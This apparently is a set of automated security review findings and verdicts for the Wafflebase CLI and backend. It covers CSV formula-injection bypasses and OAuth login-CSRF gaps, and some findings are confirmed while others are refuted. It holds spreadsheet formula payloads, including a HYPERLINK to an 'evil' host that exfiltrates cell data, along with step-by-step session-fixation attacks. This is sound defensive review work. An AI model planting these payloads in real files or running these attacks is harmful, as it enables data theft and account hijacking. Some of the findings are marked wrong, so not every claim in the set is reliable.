samples.summary: CSV formula neutralization is bypassable via an embedded carriage return, because `csvEscape` never quotes values containing `\r`
samples.evidence: `neutralizeFormula` (csv.ts:23) prepends `'` to a value starting with `=+-@\t\r`, but the quoting predicate at csv.ts:48 is `s.includes(',') || s.includes('"') || s.includes('\n')` — it omits `\r`. So a server-supplied value such as `ok\r=HYPERLINK("http://evil","x")` (settable by any other member of a shared workspace as a cell value, document title, or workspace name) is emitted **unquoted** with a raw CR inside the record. Spreadsheet/CSV importers that honour a bare CR as a record terminator (classic-Mac line endings; Excel and LibreOffice import paths do) split the line there, and the next record begins at column 0 with `=HYPERLINK(...)` — a formula the neutralizer never saw, because the value it inspected did not *start* with a trigger char. The new test at packages/cli/test/output.test.ts even pins the unquoted form (`expect(lines[6]).toBe("'\r=cmd")`), confirming the raw CR reaches the file. The same gap lets an attacker forge arbitrary extra rows/columns into `wafflebase sheets export out.csv` (which routes through this same `formatCsv`, packages/cli/src/commands/sheets-export.ts:46). Fix: add `\r` (and ideally `\t`) to the quoting condition so any control character forces a quoted field.

samples.summary: The web GitHub OAuth flow still has no `state` CSRF parameter, so `/auth/github/callback` sets session cookies for whatever code is presented (login CSRF / session fixation) — the exact class this PR fixes for the CLI
samples.evidence: `GitHubStrategy.authenticate` sets `opts.state` only when `req.__cliStateToken` is present (github.strategy.ts:59-62), and the `super({...})` options (github.strategy.ts:43-49) do not set `state: true`; there is no session middleware or passport state store anywhere in the backend (grep for `session(`/`state:` in main.ts/app.module.ts returns nothing). Consequently a browser (non-CLI) login sends no `state` to GitHub, and `AuthController.githubAuthCallback` reaches the web branch with `stateToken === undefined` (auth.controller.ts:119, 146-150) and unconditionally mints tokens and sets the auth cookies. Attack: the attacker starts a GitHub authorization for *their own* account, captures the resulting `code` without spending it, then makes the victim's browser issue `GET /auth/github/callback?code=<attacker code>` (image/iframe/link). The backend exchanges it, sets `wafflebase_session`/`wafflebase_refresh` for the attacker's account in the victim's browser, and everything the victim subsequently creates or uploads lands in the attacker's workspace. `sameSite: 'lax'` (auth.controller.ts:263) does not stop a top-level GET navigation. The PR's stated thesis is login CSRF on the loopback callback; the equivalent hole on the far larger web surface is left open. Pre-existing, but it lives in the code this change edits.

samples.summary: `CliAuthStore.csrf` is generated, stored, widened in this diff's return type, and never verified by any caller — dead protection that reads as a CSRF defence
samples.evidence: `createState` mints `csrf = randomBytes(32)` (cli-auth.store.ts:32), stores it, and `consumeState` returns it (cli-auth.store.ts:57, a line this diff rewrites). A repo-wide grep for `csrf` in packages/backend/src shows the only non-test consumers are the store itself and two comments; `AuthController.githubAuthCallback` (auth.controller.ts:120-137) destructures `mode`, `port` and now `nonce` but never reads `csrf`, and it is never sent to or returned by the CLI. A named CSRF token that nothing compares gives a false impression the CLI flow already had CSRF binding — which is precisely why the nonce had to be added. Either wire it into a check or delete it.

samples.summary: The nonce binding is optional server-side: a `mode=cli` authorization with no (or a malformed) nonce still yields a loopback redirect with no `state`, so the backend cannot enforce the new protection
samples.evidence: `parseCliNonce` (github-auth.guard.ts:10-13) silently returns `undefined` for anything that is not 32-128 lowercase hex, and the guard stores that `undefined` (github-auth.guard.ts:36-40) rather than rejecting the request. The controller then emits `stateParam = ''` (auth.controller.ts:131-133) and redirects to `http://127.0.0.1:<port>/callback?code=<code>` with no `state`. Anyone can therefore craft `https://server/auth/github?mode=cli&port=<victim port>` (no nonce) and the backend will happily mint a code and bounce the victim's browser at the loopback port with no binding at all. Updated CLIs reject it (login.ts:227), so this is not exploitable against a current client, but the server-side check is opt-out by the caller: the guard should reject `mode=cli` requests whose `nonce` is missing/malformed (400) instead of degrading to the unbound redirect, so the protection cannot be downgraded by an older or hostile client.

samples.summary: The `Origin`/method check on the loopback callback provides essentially no protection (the attack vector is a top-level GET navigation, and there is no Host-header check), so the nonce is the sole defence
samples.evidence: login.ts:214 rejects non-GET or `Origin`-bearing requests, and the docstring at login.ts:186-188 presents this as part of the CSRF defence. But the documented vector — a web page navigating/redirecting the victim to `http://127.0.0.1:/callback?code=…` or loading it as an `` — is a cross-site GET that browsers send without an `Origin` header, so it passes both checks. Additionally the server never validates the `Host` header (the URL is parsed against a hardcoded base at login.ts:206), so a DNS-rebinding page served from `http://evil.example:` reaches the handler same-origin, again with no `Origin`. Only `nonceMatches` (login.ts:227) actually stops the attack. Worth a comment correction plus a `Host` allow-list (`127.0.0.1:`/`localhost:`) so the defence-in-depth is real rather than assumed.

samples.summary: `FORMULA_TRIGGER` only matches a trigger character in position 0; leading whitespace variants (space, `\v`, `\f`, NBSP, BOM) before `=`/`+`/`-`/`@` slip past
samples.evidence: `/^[=+\-@\t\r]/` (csv.ts:6) matches only the first character. Values like ` =cmd|'/C calc'!A0`, ` =cmd` or `﻿=cmd` are emitted verbatim; importers configured to trim leading whitespace (LibreOffice's "Trim spaces", Google Sheets) then see a leading `=` and evaluate it. The comment already acknowledges the trim-based bypass for tab/CR but stops short of the other whitespace forms. Suggest stripping/matching `^[\s ﻿]*[=+\-@]` before deciding to quote.

samples.summary: The new `cells batch` parse-failure message embeds the JSON parser's message, which in Node echoes a snippet of the raw input to stderr
samples.evidence: `Invalid JSON cell data… ${e.message}` (cells.ts, new catch block) interpolates `JSON.parse`'s message, and modern V8 messages include a quoted excerpt of the offending input (e.g. `Unexpected token 'n', "nope" is not valid JSON`). When the payload piped on stdin contains sensitive cell data, a fragment of it is written to stderr and into any CI log capturing it. Low impact — the caller supplied the data — but worth truncating or omitting the excerpt.

verdict.reason: Verified directly in the repo. csv.ts:6 anchors FORMULA_TRIGGER at string start only, and csv.ts:48 quotes solely on ',', '"', or '\n' — '\r' is genuinely omitted, exactly as claimed. A value like `ok\r=HYPERLINK("http://evil","x")` passes neutralizeFormula untouched (csv.ts:24, no leading trigger char) and is emitted unquoted with a raw CR (csv.ts:51). Importers treating a bare CR as a record terminator begin a new record at `=HYPERLINK(...)`, a formula the neutralizer never inspected. The existing test at test/output.test.ts:140 pins the unquoted form `'\r=cmd`, confirming the raw CR reaches the output and further showing the mitigation is defeated even on its own test case (the `'` precedes the CR, so the post-split record still starts with `=cmd`). Reachable with attacker-controlled data via sheets-export.ts:46 -> writeFileSync at :51. No upstream sanitizer strips CR at either call site (formatter.ts:59, sheets-export.ts:46), so no already-guarded ground applies. CSV/formula injection is squarely in the Security lane, and the file's own comments (csv.ts:17-22) establish this as an intended security control against a hostile shared-workspace member — a bypassable control that reads as covered is blocking under this rubric.

verdict.reason: The web (non-CLI) GitHub OAuth flow genuinely carries no `state` parameter, and the callback does not require one. Verified: (1) github.strategy.ts:43-49 passes no `state: true` and no store to `super()`; (2) github.strategy.ts:57-64 sets `opts.state` only when `req.__cliStateToken` exists; (3) github-auth.guard.ts:33-42 sets that field only for `mode=cli` with a valid port; (4) the frontend login link (login-form.tsx:27) hits `/auth/github` bare, so it takes the no-state path; (5) main.ts:48-72 registers only bodyParser, cookieParser, ValidationPipe and CORS — no express-session/cookie-session/passport.session, and a repo-wide grep for session/state-store symbols matches only package.json:48 and the lockfile, never an import in packages/backend/src; (6) auth.controller.ts:119 skips the CLI branch when `state` is absent and lines 147-150 unconditionally mint tokens and set the auth cookies, with `sameSite: 'lax'` (auth.controller.ts:267) which does not block a top-level GET navigation. cli-auth.store.ts is the only CSRF/state store and is reachable only from the CLI guard. I searched for a counterexample (session middleware, a passport state store, a web-flow nonce, a callback-side state requirement, proxy/deploy config) and found none. This is a login-CSRF / session-fixation weakness in the auth lane: an attacker obtains an unspent `code` for their own account and navigates the victim to /auth/github/callback?code=..., causing the victim's browser to be issued attacker-account session cookies.

mergedFrom.summary: CSV output has no formula-injection neutralization; `--format csv` is now promoted as the human path

finding.summary: CSV output does not neutralize spreadsheet-formula prefixes; this change adds new server-controlled sinks into the CSV path
finding.evidence: `csvEscape` (packages/cli/src/output/csv.ts:15-24) only quotes on `,`/`"`/`\n`; it never prefixes values that begin with `=`, `+`, `-`, `@`, tab or CR. Every value it emits is server-supplied and, in a shared workspace, settable by another member (document titles, cell values/formulas, and — newly reachable via this diff — workspace `name` through `wafflebase ctx list --format csv`, `buildWorkspaceList` in packages/cli/src/commands/ctx.ts:27). Attack: a collaborator renames a workspace or document to `=cmd|'/c calc'!A0` (or `=HYPERLINK("http://evil/"&A1)` for exfiltration); the victim runs `wafflebase ctx list --format csv > ws.csv` (a flow the diff's own docs now advertise as "the human path") and opens it in Excel/LibreOffice/Sheets, which evaluates the payload. The new `cell()` helper in packages/cli/src/output/table.ts:9 was written to "mirror what formatCsv already does", so the same unescaped convention is being propagated rather than fixed. Pre-existing in csv.ts, but the diff widens the reachable data set.

verdict.reason: The finding claims csvEscape in packages/cli/src/output/csv.ts never prefixes values beginning with =, +, -, @, tab or CR. The file does exactly that. csv.ts:6 defines FORMULA_TRIGGER = /^[=+\-@\t\r]/ (the full trigger set including tab and CR), csv.ts:12 defines a PLAIN_NUMBER carve-out so signed numerics are not mangled, and neutralizeFormula (csv.ts:23-26) prefixes any triggering value with a single quote. csvEscape (csv.ts:42-52) invokes neutralizeFormula as its first action on every value, and it is applied to both the header row (csv.ts:54) and all data cells (csv.ts:55). The cited line range 15-24 is the doc comment for neutralizeFormula, not the escape function. Enumerating call sites: formatCsv is the only CSV emitter in the CLI, with exactly two callers, packages/cli/src/output/formatter.ts:59 and packages/cli/src/commands/sheets-export.ts:46, so the ctx list --format csv path through buildWorkspaceList (packages/cli/src/commands/ctx.ts:23-32) is covered and workspace name is neutralized. The secondary claim about table.ts:7-10 does not attach to a CSV sink: cell() feeds formatRecord/formatTable which emit space-padded plain text to a terminal (table.ts:24, table.ts:50-56), never CSV, so spreadsheet formula injection is not applicable there. The defect as described is not present in the working tree.

searchedFor: grep for Origin/Sec-Fetch header checks in login.ts
finding.summary: CLI OAuth loopback callback server accepts any `code` with no `state`/nonce binding (login CSRF / session fixation)
finding.evidence: `startCallbackServer` (packages/cli/src/commands/login.ts:168-227) serves `/callback` on 127.0.0.1 and resolves with whatever `code` query parameter arrives (line 177), with no `state` nonce generated at line 36 (`${server}/auth/github?mode=cli&port=${port}`), no Origin/Sec-Fetch-Site check, and no per-attempt secret. Any web page the victim visits during the 30s window (login.ts:229) can issue a no-CORS GET to `http://127.0.0.1:<port>/callback?code=<attacker_code>`; the CLI then exchanges the attacker's code (login.ts:56) and persists the attacker's tokens to ~/.wafflebase/session.json, so the victim's subsequent `wafflebase docs create`/`sheets import` writes their data into the attacker's workspace. I could not confirm exploitability end to end: the backend receives `port` in the authorize URL and may bind the issued code to it, which would force the attacker to guess the victim's ephemeral port — hence low confidence. Entirely outside this diff (pre-existing), surfaced because the diff is the auth/session-surfacing change under review. Searched: packages/cli/src for `state`, `nonce`, `csrf`, `Origin` in the login/callback path; found none.

verdict.reason:
The finding claims the CLI loopback callback accepts any `code` with no state/nonce binding, no Origin/Sec-Fetch check, and no per-attempt secret. All three protections exist in this repository, so the absence claim has a direct counterexample.

CLI side (packages/cli/src/commands/login.ts): L34 generates a per-attempt 32-byte random hex nonce via createLoginNonce (L158-160); L35 passes it into startCallbackServer(nonce); L40 builds the OAuth URL as `${server}/auth/github?mode=cli&port=${port}&nonce=${nonce}` — not the bare URL the finding quotes. The callback handler rejects any non-GET request or any request carrying an `Origin` header with 403 (L214-218), which blocks the exact no-CORS cross-origin GET described as the attack vector. It then requires the `state` query param to match the nonce using constant-time timingSafeEqual with a length pre-check (L227 calling nonceMatches, L166-175), returning 403 and deliberately NOT settling the promise, so a forged hit cannot even end the wait window for the genuine redirect.

Backend completes the round trip: packages/backend/src/auth/github-auth.guard.ts:10-13 whitelists the nonce as ^[0-9a-f]{32,128}$ (no delimiter/query smuggling) and L33-43 stores it with the single-use state; packages/backend/src/auth/cli-auth.store.ts:13,30-42,48-60 round-trips it; packages/backend/src/auth/auth.controller.ts:131-136 appends `&state=<nonce>` to the 127.0.0.1 loopback redirect, so only the genuine redirect can satisfy the CLI check.

Tests pin the behavior: packages/cli/test/login.test.ts:55-73 asserts a code with a wrong state is refused and the server keeps waiting; packages/backend/src/auth/auth.controller.spec.ts:214-230 asserts the nonce echo. The finding's cited line numbers (168-227, 177, 36, 229) do not correspond to the actual file contents, indicating stale evidence from a different revision.
